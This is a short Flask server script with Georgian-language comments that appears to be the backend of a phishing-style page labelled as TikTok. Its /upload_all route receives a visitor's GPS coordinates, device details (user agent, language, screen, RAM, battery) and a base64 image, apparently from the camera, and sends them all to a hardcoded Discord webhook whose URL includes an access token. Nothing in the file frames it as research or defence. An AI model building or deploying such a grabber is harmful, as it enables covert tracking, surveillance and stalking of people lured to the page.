from flask import Flask, request, render_template
from flask_cors import CORS
import requests
import base64
import os

app = Flask(__name__)
CORS(app)

# 🚨 ახალი დისქორდის ლინკი
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1571037523944144916/M166376XMNczFiKd5_afTR2wCx9XQ1UNdtq7n4vGjAuP5MNtM8cBxnWHpbHb5OVX28Bz")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload_all', methods=['POST'])
def upload_all():
    try:
        data = request.json
        
        if data.get('lat') and data['lat'] != "უარი":
            maps_link = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
            location_text = f"📍 **ლოკაცია:** [დააჭირე რუკის საჩვენებლად]({maps_link})"
        else:
            location_text = "📍 **ლოკაცია:** მომხმარებელმა უარი თქვა"

        content = f"""
🎯 **ახალი მონაცემები (TikTok)!**
{location_text}

💻 **მოწყობილობის ინფორმაცია:**
• **ბრაუზერი:** `{data.get('userAgent', 'უცნობია')}`
• **ენა:** `{data.get('language', 'უცნობია')}`
• **ეკრანი:** `{data.get('screen', 'უცნობია')}`
• **RAM:** `{data.get('ram', 'უცნობია')}`
• **ბატარეა:** `{data.get('battery', 'უცნობია')}`
        """
        
        requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
        
        if data.get('image'):
            image_data = data['image'].replace("data:image/png;base64,", "")
            image_bytes = base64.b64decode(image_data)
            files = {"file": ("foto.png", image_bytes, "image/png")}
            requests.post(DISCORD_WEBHOOK_URL, files=files)
        
        return "წარმატება"
    except Exception as e:
        print(f"❌ შეცდომა: {e}")
        return "შეცდომა"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
            
